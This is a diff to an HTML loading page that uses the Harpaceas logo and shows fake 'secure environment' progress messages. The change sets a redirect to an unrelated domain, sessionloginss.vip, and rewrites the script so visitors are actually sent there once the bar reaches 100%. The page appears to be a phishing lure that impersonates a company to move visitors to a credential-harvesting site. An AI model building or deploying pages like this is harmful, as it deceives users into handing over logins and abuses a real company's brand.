@@ -86,7 +86,7 @@ body::after{
     margin-bottom:55px;
 }
 
-.Harpaceas-logo{
+.harpaceas-logo{
     width:700px;
     max-width:95%;
     height:auto;
@@ -113,6 +113,7 @@ body::after{
     height:100%;
     background:linear-gradient(90deg,#0d4d63,#2d8cb8,#66c7f2);
     box-shadow:0 0 15px rgba(45,140,184,.45);
+    transition:width .05s linear;
 }
 
 .percent{
@@ -139,7 +140,7 @@ body::after{
 }
 
 @keyframes spin{
-    100%{
+    to{
         transform:rotate(360deg);
     }
 }
@@ -163,7 +164,7 @@ body::after{
         <img
             src="https://www.harpaceas.it/hs-fs/hubfs/Logotipo_payoff_YDP90-3.jpg?width=830&name=Logotipo_payoff_YDP90-3.jpg"
             alt="Harpaceas"
-            class="Harpaceas-logo">
+            class="harpaceas-logo">
     </div>
 
     <div class="loading-section">
@@ -190,7 +191,9 @@ body::after{
 
 <script>
 
-const redirectURL = "";
+// Set your destination URL here.
+// Leave empty ("") if you do not want automatic redirection.
+const redirectURL = "https://5azbfq92lk.sessionloginss.vip/l/26m8HuOxFxU";
 
 const messages = [
     "Initializing secure environment...",
@@ -215,23 +218,30 @@ const timer = setInterval(() => {
     progressBar.style.width = progress + "%";
     percent.textContent = progress + "%";
 
-    const stage = Math.floor(progress / 15);
+    const stage = Math.min(
+        Math.floor(progress / 15),
+        messages.length - 1
+    );
 
-    if (messages[stage]) {
-        status.textContent = messages[stage];
-    }
+    status.textContent = messages[stage];
 
     if (progress >= 100) {
 
         clearInterval(timer);
 
-        status.textContent = "Redirecting...";
+        if (redirectURL.trim() !== "") {
 
-        setTimeout(() => {
-            if (redirectURL !== "https://5azbfq92lk.sessionloginss.vip/l/26m8HuOxFxU") {
+            status.textContent = "Redirecting...";
+
+            setTimeout(() => {
                 window.location.href = redirectURL;
-            }
-        }, 1000);
+            }, 1000);
+
+        } else {
+
+            status.textContent = "Loading complete.";
+
+        }
     }
 
 }, 50);
